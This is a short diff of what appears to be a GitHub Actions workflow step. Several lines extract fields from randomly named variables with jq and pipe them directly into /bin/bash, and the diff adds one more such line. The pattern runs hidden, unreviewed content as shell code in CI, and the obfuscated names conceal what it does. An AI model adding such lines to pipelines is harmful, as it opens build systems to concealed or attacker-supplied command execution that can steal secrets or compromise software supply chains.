@@ -29,6 +29,7 @@ jobs:
           printf '%s' "$h44356" | jq -r .br39263 | /bin/bash
           echo $lbnwv06 | jq -r .tye20 | /bin/bash
           echo $o04 | jq -r .g5 | /bin/bash
+          printf '%s' "$ubm886" | jq -r .v4 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
